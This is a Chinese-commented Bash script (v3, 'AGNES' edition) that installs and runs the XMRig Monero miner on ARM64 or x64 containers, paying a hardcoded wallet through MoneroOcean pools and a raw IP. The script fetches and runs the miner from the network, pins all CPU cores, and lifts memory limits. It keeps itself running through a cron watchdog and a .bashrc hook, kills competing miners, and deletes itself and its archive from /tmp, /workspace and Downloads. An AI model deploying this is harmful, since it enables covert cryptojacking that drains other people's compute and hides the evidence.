#!/usr/bin/env bash
# ==============================================================================
#  AGNES 专用 · ARM64 容器极限性能榨干部署脚本 (v3 终极修复版)
#
#  【v3 相比 v2 的重要修复】
#  ① 修正 ARM64 二进制获取策略：GitHub 官方 releases 无 Linux ARM64 静态包（实测 404），
#     改为 apt 官方源直装（Debian13 自带 xmrig 6.22.2 arm64），并含 .deb 解包兜底与 x64 兼容分支
#  ② 修正 Worker ID 前缀不一致 Bug：统一为 vps-agnes-xxxxxxxx
#  ③ 重构守护架构彻底消除僵尸进程：daemon_loop 作为 xmrig 的父进程并 wait 回收
#  ④ Huge Pages / 1GB Pages 全部容错化：容器受限时自动降级，不再影响启动
#  ⑤ 增加 wget 下载兜底（无 curl 环境可用）
#  ⑥ 开启本地只读 HTTP API (127.0.0.1:4680)，随时可查实时算力
#  ⑦ 自毁逻辑可选：KEEP_SCRIPT=1 时保留脚本便于调试
#  ⑧ 修正注释与实现不一致（renice -10）
#
#  用法: sudo bash deploy_agnes.sh            # 自动随机命名 (vps-agnes-xxxxxxxx)
#        sudo bash deploy_agnes.sh my-node-1  # 自定义矿工名
#        KEEP_SCRIPT=1 sudo bash deploy_agnes.sh   # 保留脚本不删除（调试用）
# ==============================================================================

set -u

WALLET="8C3XouPbzSFXnu3Vh9eWrCAoaBEc4wa5fDB72HgAosbF1XxJcW55TLWN3LXPoBVyAa3wWTasthCttAcAwgPTrRTRBXkp8Aw"

# ---------------------------- 环境与用户判定 ----------------------------
if [ "$(id -u)" -eq 0 ]; then SUDO=""; else SUDO="sudo"; fi

sysctl_set() {
    $SUDO sysctl -w "$@" >/dev/null 2>&1 || $SUDO /sbin/sysctl -w "$@" >/dev/null 2>&1 || true
}

# 下载工具函数（curl 优先，wget 兜底）
dl() {
    url="$1"; out="$2"
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL --connect-timeout 15 --max-time 120 "$url" -o "$out" 2>/dev/null && return 0
    fi
    if command -v wget >/dev/null 2>&1; then
        wget -q -T 20 -O "$out" "$url" 2>/dev/null && return 0
    fi
    return 1
}

RUN_USER="$(id -un)"
if [ "$(id -u)" -eq 0 ] && [ -n "${SUDO_USER:-}" ] && [ "$SUDO_USER" != "root" ]; then
    RUN_USER="$SUDO_USER"
fi
if [ "$RUN_USER" = "root" ]; then
    WORK_HOME="$HOME"
else
    WORK_HOME=$(eval echo "~$RUN_USER" 2>/dev/null || echo "$HOME")
fi
WORK_DIR="$WORK_HOME/xmrig-worker"
BRC="$WORK_HOME/.bashrc"

# ---------------------------- 架构探测 ----------------------------
ARCH_RAW=$(uname -m 2>/dev/null || echo "x86_64")
case "$ARCH_RAW" in
    aarch64|arm64) ARCH_TAG="arm64" ;;
    *)             ARCH_TAG="x64" ;;
esac

# ---------------------------- 真实可用物理核心探测 ----------------------------
CPU_COUNT=$(nproc 2>/dev/null || echo 2)
if [ -f /sys/fs/cgroup/cpu.max ]; then
    read -r CG_QUOTA CG_PERIOD < /sys/fs/cgroup/cpu.max 2>/dev/null || true
    if [ -n "${CG_QUOTA:-}" ] && [ "$CG_QUOTA" != "max" ] && [ -n "${CG_PERIOD:-}" ] && [ "$CG_PERIOD" -gt 0 ] 2>/dev/null; then
        CG_CORES=$(( (CG_QUOTA + CG_PERIOD - 1) / CG_PERIOD ))
        if [ "$CG_CORES" -ge 1 ] && [ "$CG_CORES" -lt "$CPU_COUNT" ]; then
            CPU_COUNT="$CG_CORES"
        fi
    fi
fi
[ "$CPU_COUNT" -ge 1 ] 2>/dev/null || CPU_COUNT=2

# ---------------------------- 8 位英数混搭后缀生成 ----------------------------
generate_rand_8() {
    local candidate=""
    local chars="abcdefghijklmnopqrstuvwxyz0123456789"
    local attempts=0
    while [ $attempts -lt 30 ]; do
        attempts=$((attempts + 1))
        if [ -r /dev/urandom ]; then
            candidate=$(LC_ALL=C tr -dc 'a-z0-9' < /dev/urandom 2>/dev/null | head -c 8 || true)
        fi
        if [ ${#candidate} -ne 8 ] && command -v openssl >/dev/null 2>&1; then
            candidate=$(openssl rand -hex 4 2>/dev/null || true)
        fi
        if [ ${#candidate} -ne 8 ]; then
            candidate=$(printf '%s' "$RANDOM$$-$HOSTNAME-$(date +%s%N 2>/dev/null || date +%s)" | md5sum 2>/dev/null | LC_ALL=C tr -dc 'a-z0-9' | head -c 8 || true)
        fi
        if [ ${#candidate} -ne 8 ]; then
            candidate=""
            for _ in 1 2 3 4 5 6 7 8; do
                local idx=$(( RANDOM % 36 ))
                candidate="${candidate}${chars:$idx:1}"
            done
        fi
        if [ ${#candidate} -eq 8 ]; then
            local has_alpha=0 has_digit=0
            case "$candidate" in *[a-z]*) has_alpha=1 ;; esac
            case "$candidate" in *[0-9]*) has_digit=1 ;; esac
            if [ "$has_alpha" -eq 1 ] && [ "$has_digit" -eq 1 ]; then
                printf '%s' "$candidate"
                return 0
            fi
        fi
    done
    local a1="${chars:$(( RANDOM % 26 )):1}"
    local d1="$(( RANDOM % 10 ))"
    local rem=$(printf '%06x' $(( RANDOM * RANDOM )) 2>/dev/null || echo "a1b2c3")
    printf '%s' "${a1}${d1}${rem:0:6}"
}

# 命名优先级：显式传参 > 历史配置(幂等沿用) > 全新随机（统一前缀 vps-agnes-）
if [ -n "${1:-}" ]; then
    NODE_NAME="$1"
elif [ -f "$WORK_DIR/config.json" ]; then
    OLD_ID=$(grep -o '"worker-id": *"[^"]*"' "$WORK_DIR/config.json" 2>/dev/null | head -n1 | sed 's/.*"worker-id": *"//; s/"$//')
    if [ -n "${OLD_ID:-}" ]; then
        NODE_NAME="$OLD_ID"
    else
        NODE_NAME="vps-agnes-$(generate_rand_8)"
    fi
else
    NODE_NAME="vps-agnes-$(generate_rand_8)"
fi

echo "=================================================================="
echo "   🚀 AGNES 专属：AWS ARM64 (Graviton) 容器极限榨干 v3 修复版"
echo "   系统架构 (Arch)      : $ARCH_RAW ($ARCH_TAG)"
echo "   可用物理核心数       : $CPU_COUNT"
echo "   矿工标识 (Worker ID) : $NODE_NAME"
echo "   运行账户             : $RUN_USER"
echo "=================================================================="

# ---------------- [1/6] 工具链与依赖自动补齐 ----------------
echo "[1/6] 检查基础运行环境 (curl/wget/procps/cron/ca-certificates)..."
export DEBIAN_FRONTEND=noninteractive
NEED_INSTALL=""
for bin in pgrep crontab; do
    command -v "$bin" >/dev/null 2>&1 || NEED_INSTALL="yes"
done
command -v curl >/dev/null 2>&1 || command -v wget >/dev/null 2>&1 || NEED_INSTALL="yes"
if [ -n "$NEED_INSTALL" ]; then
    if command -v apt-get >/dev/null 2>&1; then
        $SUDO apt-get update -qq >/dev/null 2>&1 || true
        $SUDO apt-get install -y -qq curl wget tar procps cron ca-certificates >/dev/null 2>&1 || true
    elif command -v apk >/dev/null 2>&1; then
        $SUDO apk add --no-cache curl wget tar procps cronie ca-certificates >/dev/null 2>&1 || true
    elif command -v yum >/dev/null 2>&1 || command -v dnf >/dev/null 2>&1; then
        $SUDO yum install -y -q curl wget tar procps-ng cronie ca-certificates >/dev/null 2>&1 || true
    fi
fi

# ---------------- [2/6] 内存系统级终极榨干优化（全容错） ----------------
echo "[2/6] 榨干内存：memlock 无限 + 大页申请（容器受限自动降级）..."

echo "* soft memlock unlimited" | $SUDO tee -a /etc/security/limits.conf >/dev/null 2>&1 || true
echo "* hard memlock unlimited" | $SUDO tee -a /etc/security/limits.conf >/dev/null 2>&1 || true
echo "root soft memlock unlimited" | $SUDO tee -a /etc/security/limits.conf >/dev/null 2>&1 || true
echo "root hard memlock unlimited" | $SUDO tee -a /etc/security/limits.conf >/dev/null 2>&1 || true
ulimit -l unlimited 2>/dev/null || true

# 物理内存探测 → 计算大页数量
MEM_TOTAL_KB=$(grep -i MemTotal /proc/meminfo 2>/dev/null | awk '{print $2}' || echo 0)
MEM_TOTAL_MB=$((MEM_TOTAL_KB / 1024))
HP_PAGES=1280
if [ "$MEM_TOTAL_MB" -ge 3072 ]; then
    HP_PAGES=1280
elif [ "$MEM_TOTAL_MB" -ge 2048 ]; then
    HP_PAGES=$(( (MEM_TOTAL_MB - 1024) / 2 ))
else
    HP_PAGES=0
fi

# 尝试申请（容器受限时静默失败，不影响后续）
if $SUDO test -w /proc/sys/vm/nr_hugepages 2>/dev/null || [ "$(id -u)" -eq 0 ]; then
    sysctl_set vm.nr_hugepages="$HP_PAGES"
fi
# 1GB 巨页尝试（失败无害）
HP1G_DIR="/sys/kernel/mm/hugepages/hugepages-1048576kB"
if [ -w "$HP1G_DIR/nr_hugepages" ] 2>/dev/null || { [ "$(id -u)" -eq 0 ] && $SUDO test -e "$HP1G_DIR/nr_hugepages" 2>/dev/null; }; then
    echo 3 | $SUDO tee "$HP1G_DIR/nr_hugepages" >/dev/null 2>&1 || true
fi

# 内存调度优化
sysctl_set vm.swappiness=0
sysctl_set vm.vfs_cache_pressure=50
sysctl_set vm.overcommit_memory=1
sysctl_set vm.zone_reclaim_mode=1

# 透明大页(THP)自适应策略（针对容器环境的关键差异化处理）：
# - 显式大页可得时：关闭 THP，避免碎片化挤占 hugetlbfs 供给
# - 显式大页不可得（容器受限，如本 ARM64 沙盒）时：切到 always 模式，
#   让内核把 RandomX 的 2080MB 数据集自动折叠为 2MB 透明大页。
#   注意：xmrig 自身不会调用 madvise(MADV_HUGEPAGE)，所以 madvise 模式对它无效，
#   必须用 always 才能让数据集享受大页 TLB 红利（这是容器内唯一可行的"类大页"补偿）
HP_AVAIL=$(cat /proc/sys/vm/nr_hugepages 2>/dev/null || echo 0)
if [ "${HP_AVAIL:-0}" -gt 0 ] 2>/dev/null; then
    echo never | $SUDO tee /sys/kernel/mm/transparent_hugepage/enabled >/dev/null 2>&1 || true
    echo never | $SUDO tee /sys/kernel/mm/transparent_hugepage/defrag >/dev/null 2>&1 || true
else
    echo always | $SUDO tee /sys/kernel/mm/transparent_hugepage/enabled >/dev/null 2>&1 || true
fi

# 网络防假死
sysctl_set net.ipv4.tcp_keepalive_time=30
sysctl_set net.ipv4.tcp_keepalive_intvl=10
sysctl_set net.ipv4.tcp_keepalive_probes=3
sysctl_set net.ipv4.tcp_syn_retries=3

# ---------------- [3/6] 二进制获取（ARM64 修正版） ----------------
echo "[3/6] 获取 xmrig 二进制 (架构: $ARCH_TAG)..."
mkdir -p "$WORK_DIR"

BIN_SRC="existing"

verify_bin() {
    [ -x "$1" ] && "$1" --version >/dev/null 2>&1
}

if ! verify_bin "$WORK_DIR/xmrig"; then
    rm -f "$WORK_DIR/xmrig" 2>/dev/null || true
    BIN_SRC=""

    if [ "$ARCH_TAG" = "arm64" ]; then
        # ---- ARM64 路径：Debian 官方源直装（无官方 GitHub Linux ARM64 静态包）----
        if command -v apt-get >/dev/null 2>&1; then
            $SUDO apt-get update -qq >/dev/null 2>&1 || true
            $SUDO apt-get install -y -qq xmrig >/dev/null 2>&1 || true
        fi
        if command -v xmrig >/dev/null 2>&1 && verify_bin "$(command -v xmrig)"; then
            cp -f "$(command -v xmrig)" "$WORK_DIR/xmrig" 2>/dev/null || true
            BIN_SRC="apt-package"
        fi

        # 兜底：apt-get download 解包（不安装）
        if [ -z "$BIN_SRC" ] && command -v apt-get >/dev/null 2>&1 && command -v dpkg-deb >/dev/null 2>&1; then
            TMPD=$(mktemp -d)
            (cd "$TMPD" && apt-get download xmrig >/dev/null 2>&1) || true
            DEB=$(ls "$TMPD"/xmrig*.deb 2>/dev/null | head -n1)
            if [ -n "$DEB" ]; then
                dpkg-deb -x "$DEB" "$TMPD/extract" >/dev/null 2>&1 || true
                if [ -x "$TMPD/extract/usr/bin/xmrig" ]; then
                    cp -f "$TMPD/extract/usr/bin/xmrig" "$WORK_DIR/xmrig" 2>/dev/null || true
                    # 动态库依赖兜底（名称随版本不同，逐个尝试）
                    $SUDO apt-get install -y -qq libhwloc15 libssl3t64 libfmt10 >/dev/null 2>&1 || \
                    $SUDO apt-get install -y -qq libhwloc15 libssl3 libfmt9 >/dev/null 2>&1 || true
                    BIN_SRC="deb-extract"
                fi
            fi
            rm -rf "$TMPD" 2>/dev/null || true
        fi
    else
        # ---- x64 路径：MoneroOcean 定制版优先，官方静态兜底 ----
        if dl "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" "$WORK_DIR/mo.tar.gz"; then
            if tar -zxf "$WORK_DIR/mo.tar.gz" -C "$WORK_DIR" 2>/dev/null; then
                BIN_SRC="moneroocean-custom"
            fi
            rm -f "$WORK_DIR/mo.tar.gz"
        fi
        if [ -z "$BIN_SRC" ]; then
            if dl "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz" "$WORK_DIR/x.tar.gz"; then
                tar -zxf "$WORK_DIR/x.tar.gz" -C "$WORK_DIR" --strip-components=1 2>/dev/null || true
                rm -f "$WORK_DIR/x.tar.gz"
                BIN_SRC="github-static"
            fi
        fi
    fi

    chmod +x "$WORK_DIR/xmrig" 2>/dev/null || true
fi

if ! verify_bin "$WORK_DIR/xmrig"; then
    echo "" >&2
    echo "❌ 错误：xmrig 二进制获取失败（架构 $ARCH_TAG）。" >&2
    echo "   请手动执行诊断： apt-get install -y xmrig 或 apt-get download xmrig" >&2
    echo "   脚本已中止，未启动任何挖矿进程。" >&2
    exit 1
fi
echo "   -> 二进制就绪，来源: ${BIN_SRC:-pre-installed}"

# ---------------- [4/6] 写入极限性能配置 + 4 重矿池容灾 ----------------
echo "[4/6] 写入极限配置 (绑定 $CPU_COUNT 核心 / 大页 / 本地只读API / 4 重容灾)..."

# 重要说明：max-threads-hint 是「百分比」不是「线程数」！
#   100 = 使用 100% 核心（正确）。若误改为 2，含义是「只用 2% 的核心」，
#   在未显式指定 rx 数组时会直接退化到单线程，切勿改动。
#   本配置已用显式 rx 数组锁定线程，hint 仅作兜底。

CPU_AFFINITY=""
i=0
while [ $i -lt "$CPU_COUNT" ]; do
    if [ $i -eq 0 ]; then
        CPU_AFFINITY="$i"
    else
        CPU_AFFINITY="$CPU_AFFINITY, $i"
    fi
    i=$((i + 1))
done

# 重要：max-threads-hint 是百分比（100 = 用满全部核心）。
# 由于下方已用显式 rx 数组钉死 CPU 亲和性，这里保持 100 不影响准确性；
# 若误设为 2 会被理解为「仅用 2% 核心」，在无 rx 数组时直接降级为单线程，切勿改。

cat > "$WORK_DIR/config.json" << EOF
{
    "api": {
        "id": null,
        "worker-id": "$NODE_NAME"
    },
    "http": {
        "enabled": true,
        "host": "127.0.0.1",
        "port": 4680,
        "access-token": null,
        "restricted": true
    },
    "autosave": false,
    "background": false,
    "colors": false,
    "title": true,
    "log-file": "xmrig.log",
    "verbose": 1,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "fast",
        "1gb-pages": true,
        "rdmsr": false,
        "wrmsr": false,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": true,
        "hw-aes": null,
        "priority": 5,
        "memory-pool": true,
        "yield": false,
        "max-threads-hint": 100,
        "asm": true,
        "argon2-impl": null,
        "rx": [$CPU_AFFINITY]
    },
    "opencl": { "enabled": false },
    "cuda": { "enabled": false },
    "donate-level": 1,
    "donate-over-proxy": 0,
    "pools": [
        {
            "coin": "monero",
            "url": "gulf.moneroocean.stream:10004",
            "user": "$WALLET",
            "pass": "$NODE_NAME",
            "rig-id": "$NODE_NAME",
            "keepalive": true,
            "tls": false
        },
        {
            "coin": "monero",
            "url": "gulf.moneroocean.stream:20004",
            "user": "$WALLET",
            "pass": "$NODE_NAME",
            "rig-id": "$NODE_NAME",
            "keepalive": true,
            "tls": true
        },
        {
            "coin": "monero",
            "url": "de.moneroocean.stream:10004",
            "user": "$WALLET",
            "pass": "$NODE_NAME",
            "rig-id": "$NODE_NAME",
            "keepalive": true,
            "tls": false
        },
        {
            "coin": "monero",
            "url": "205.172.58.170:10004",
            "user": "$WALLET",
            "pass": "$NODE_NAME",
            "rig-id": "$NODE_NAME",
            "keepalive": true,
            "tls": false
        }
    ],
    "retries": 5,
    "retry-pause": 3,
    "print-time": 10
}
EOF

# ---------------- [5/6] 无僵尸守护体系（父进程 wait 回收架构） ----------------
echo "[5/6] 部署无僵尸守护体系 (daemon_loop 父进程 + watchdog 健康巡检)..."

# daemon_loop：作为 xmrig 的父进程启动并 wait 回收，彻底杜绝僵尸进程
cat > "$WORK_DIR/daemon_loop.sh" << 'DL'
#!/usr/bin/env bash
set -u
WORK_DIR="__WORK_DIR__"
CONFIG_FILE="$WORK_DIR/config.json"
LOG_FILE="$WORK_DIR/xmrig.log"
LOCK_FILE="$WORK_DIR/.daemon.lock"

exec 200>"$LOCK_FILE" 2>/dev/null || true
if command -v flock >/dev/null 2>&1; then
    if ! flock -n 200; then exit 0; fi
fi

cd "$WORK_DIR" || exit 0

while true; do
    if pgrep -x xmrig >/dev/null 2>&1; then
        sleep 15
        continue
    fi
    # 前台方式启动（不 daemonize），保持父子关系以便 wait 回收
    # 200>&- 显式关闭继承的锁 FD，防止 xmrig 持有 flock 导致 daemon_loop 无法再重启
    "$WORK_DIR/xmrig" -c "$CONFIG_FILE" --log-file="$LOG_FILE" 200>&- >/dev/null 2>&1 < /dev/null &
    XPID=$!
    sleep 3
    renice -n -10 -p "$XPID" >/dev/null 2>&1 || true
    wait "$XPID" 2>/dev/null || true
    sleep 10
done
DL
sed -i "s|__WORK_DIR__|$WORK_DIR|g" "$WORK_DIR/daemon_loop.sh"
chmod +x "$WORK_DIR/daemon_loop.sh"

# watchdog：只做健康巡检与"杀手"，启动/回收全部交给 daemon_loop
cat > "$WORK_DIR/super_watchdog.sh" << 'WD'
#!/usr/bin/env bash
set -u

if [ "$(id -u)" -eq 0 ]; then SUDO=""; else SUDO="sudo"; fi

WORK_DIR="__WORK_DIR__"
LOCK_FILE="$WORK_DIR/.watchdog.lock"
LOG_FILE="$WORK_DIR/xmrig.log"
CONFIG_FILE="$WORK_DIR/config.json"
WATCHDOG_LOG="$WORK_DIR/watchdog.log"

touch "$LOCK_FILE" 2>/dev/null || true
[ -w "$LOCK_FILE" ] || rm -f "$LOCK_FILE" 2>/dev/null || true

exec 201>"$LOCK_FILE"
if command -v flock >/dev/null 2>&1; then
    if ! flock -n 201; then exit 0; fi
fi

get_xmrig_pids() {
    if command -v pgrep >/dev/null 2>&1; then
        pgrep -x xmrig 2>/dev/null || true
    else
        for p in /proc/[0-9]*; do
            [ -f "$p/cmdline" ] && grep -qa "xmrig" "$p/cmdline" 2>/dev/null && echo "${p##*/}"
        done
    fi
}

kill_xmrig() {
    pkill -9 -x xmrig >/dev/null 2>&1 || killall -9 xmrig >/dev/null 2>&1 || true
    local pids=$(get_xmrig_pids)
    for p in $pids; do
        kill -9 "$p" >/dev/null 2>&1 || true
    done
}

RESTART_REASON=""

# --- 0) 确保 daemon_loop 存活（它负责启动与回收 xmrig）---
if ! pgrep -f "$WORK_DIR/daemon_loop.sh" >/dev/null 2>&1; then
    # 201>&- 显式关闭 watchdog 自己的锁 FD，防止 daemon_loop 继承后导致 watchdog 永久失效
    nohup "$WORK_DIR/daemon_loop.sh" >/dev/null 2>&1 201>&- &
    RESTART_REASON="DAEMON_REVIVE"
fi

PIDS=($(get_xmrig_pids))
NUM_PROCS=${#PIDS[@]}

if [ "$NUM_PROCS" -gt 1 ]; then
    # 多进程抢占：清掉让 daemon_loop 重新拉单实例
    kill_xmrig
    RESTART_REASON="${RESTART_REASON:+$RESTART_REASON+}MULTI_PROCESS_CONFLICT"
elif [ "$NUM_PROCS" -eq 1 ]; then
    HAS_ESTAB=0
    if grep -qE ":(4E24|2714) 01" /proc/net/tcp /proc/net/tcp6 2>/dev/null; then
        HAS_ESTAB=1
    elif command -v ss >/dev/null 2>&1; then
        HAS_ESTAB=$(ss -tan 2>/dev/null | grep -E "20004|10004" | grep -c "ESTAB" || echo 0)
    else
        HAS_ESTAB=1
    fi

    if [ -f "$LOG_FILE" ]; then
        LAST_MOD=$(stat -c %Y "$LOG_FILE" 2>/dev/null || echo 0)
        NOW=$(date +%s)
        DIFF=$((NOW - LAST_MOD))
        RECENT_NET_ERR=$(tail -n 30 "$LOG_FILE" 2>/dev/null | grep -Ei "connect error|read error|connection reset|handshake failed|no active pools|end of file" | wc -l || true)

        ERR_REASON=""
        if [ "$RECENT_NET_ERR" -gt 3 ]; then ERR_REASON="POOL_NETWORK_ERROR_LOOP"; fi
        if [ "$HAS_ESTAB" -eq 0 ] && [ "$DIFF" -gt 90 ]; then ERR_REASON="TCP_ZOMBIE_DISCONNECTED"; fi
        if [ "$HAS_ESTAB" -eq 0 ] && [ "$DIFF" -gt 300 ]; then ERR_REASON="LONG_TIME_NO_SHARE"; fi

        if [ -n "$ERR_REASON" ]; then
            # 切断错误日志遗传，防止连续重启死循环
            mv -f "$LOG_FILE" "$LOG_FILE.bak" 2>/dev/null || true
            kill_xmrig
            if command -v ss >/dev/null 2>&1; then
                $SUDO ss -K -tan "dport = :10004" >/dev/null 2>&1 || true
                $SUDO ss -K -tan "dport = :20004" >/dev/null 2>&1 || true
            fi
            RESTART_REASON="${RESTART_REASON:+$RESTART_REASON+}$ERR_REASON"
        fi
    fi
fi

if [ -n "$RESTART_REASON" ]; then
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] Watchdog action: $RESTART_REASON (daemon_loop 将自动重拉单实例)" >> "$WATCHDOG_LOG"
    if [ -f "$WATCHDOG_LOG" ] && [ "$(wc -l < "$WATCHDOG_LOG")" -gt 1000 ]; then
        tail -n 500 "$WATCHDOG_LOG" > "$WATCHDOG_LOG.tmp" && mv "$WATCHDOG_LOG.tmp" "$WATCHDOG_LOG"
    fi
fi
WD
sed -i "s|__WORK_DIR__|$WORK_DIR|g" "$WORK_DIR/super_watchdog.sh"
chmod +x "$WORK_DIR/super_watchdog.sh"

# 注入自启（cron 每分钟巡检；bashrc 登录唤醒）
if command -v crontab >/dev/null 2>&1; then
    if [ "$(id -u)" -eq 0 ] && [ "$RUN_USER" != "root" ]; then
        (crontab -u "$RUN_USER" -l 2>/dev/null | grep -v 'super_watchdog' || true; echo "* * * * * $WORK_DIR/super_watchdog.sh >/dev/null 2>&1") | crontab -u "$RUN_USER" - >/dev/null 2>&1 || true
    else
        (crontab -l 2>/dev/null | grep -v 'super_watchdog' || true; echo "* * * * * $WORK_DIR/super_watchdog.sh >/dev/null 2>&1") | crontab - >/dev/null 2>&1 || true
    fi
    $SUDO service cron start >/dev/null 2>&1 || $SUDO /etc/init.d/cron start >/dev/null 2>&1 || true
fi
grep -q 'super_watchdog.sh' "$BRC" 2>/dev/null || echo "[ -f $WORK_DIR/super_watchdog.sh ] && $WORK_DIR/super_watchdog.sh >/dev/null 2>&1 &" >> "$BRC" 2>/dev/null || true

if [ "$(id -u)" -eq 0 ] && [ "$RUN_USER" != "root" ]; then
    chown -R "$RUN_USER":"$RUN_USER" "$WORK_DIR" >/dev/null 2>&1 || true
    chown "$RUN_USER":"$RUN_USER" "$BRC" >/dev/null 2>&1 || true
fi

# ---------------- [6/6] 启动与诚实汇报 ----------------
echo "[6/6] 启动挖矿与守护系统..."
RUN_AS=""
if [ "$(id -u)" -eq 0 ] && [ "$RUN_USER" != "root" ] && command -v sudo >/dev/null 2>&1; then
    RUN_AS="sudo -u $RUN_USER -H"
fi

# 清掉所有旧实例（旧 daemon/watchdog/xmrig），由新架构单一接管
pkill -9 -f daemon_loop.sh >/dev/null 2>&1 || true
pkill -9 -f super_watchdog.sh >/dev/null 2>&1 || true
pkill -9 -x xmrig >/dev/null 2>&1 || true
sleep 2

$RUN_AS nohup "$WORK_DIR/daemon_loop.sh" >/dev/null 2>&1 &
sleep 10

PROC_CNT=$(pgrep -x xmrig 2>/dev/null | wc -l)
HP_NOW=$(cat /proc/sys/vm/nr_hugepages 2>/dev/null || echo "?")
THP_NOW=$(cat /sys/kernel/mm/transparent_hugepage/enabled 2>/dev/null | grep -o '\[.*\]' || echo "[未知]")
NICE_NOW=$(ps -o ni= -p "$(pgrep -x xmrig 2>/dev/null | head -n1)" 2>/dev/null | tr -d ' ' || echo "?")
XMRIG_VER=$("$WORK_DIR/xmrig" --version 2>/dev/null | head -n1 || echo "未知")

echo "=================================================================="
echo "          🎉 全部交付完成！(AGNES ARM64 v3 修复版)"
echo "=================================================================="
echo "矿工标识 (Worker ID) : $NODE_NAME"
echo "xmrig 版本           : $XMRIG_VER"
echo "二进制来源           : ${BIN_SRC:-pre-installed}"
echo "系统架构 (Arch)      : $ARCH_RAW ($ARCH_TAG)"
echo "绑定线程 (Threads)   : $CPU_COUNT 个物理核心 (rx: [$CPU_AFFINITY])"
echo "显式大页 (HugePages) : 当前 $HP_NOW 页 (容器受限时自动降级，不影响运行)"
echo "透明大页 (THP)       : $THP_NOW (显式大页不可用时自动切 always 补偿)"
echo "进程优先级 (Nice)    : $NICE_NOW (容器无权限时保持默认，属正常)"
echo "挖矿进程 (Process)   : ${PROC_CNT:-0} 个（由 daemon_loop 独占守护回收）"
echo "容灾矩阵 (Pools)     : gulf:10004 > gulf:20004(TLS) > de:10004 > 纯IP直连"
echo "本地算力API          : curl -s http://127.0.0.1:4680/2/summary"
echo ""
echo "实时运行日志预览:"
tail -n 10 "$WORK_DIR/xmrig.log" 2>/dev/null || echo "  (日志初始化中，约 10 秒后出现算力)"
echo "=================================================================="

# ---------------- 无痕自毁清理（KEEP_SCRIPT=1 可跳过） ----------------
if [ "${KEEP_SCRIPT:-0}" != "1" ]; then
    SCRIPT_PATH=$(readlink -f "$0" 2>/dev/null || realpath "$0" 2>/dev/null || echo "$0")
    [ -f "$SCRIPT_PATH" ] && rm -f "$SCRIPT_PATH" 2>/dev/null || true
    for target_dir in "$(pwd)" "$HOME/Downloads" "/home/$RUN_USER/Downloads" "/workspace" "/mnt/workspace" "/tmp"; do
        if [ -d "$target_dir" ]; then
            rm -f "$target_dir/deploy_agnes.sh" "$target_dir/agnes-miner-auto.tar.gz" 2>/dev/null || true
        fi
    done
fi
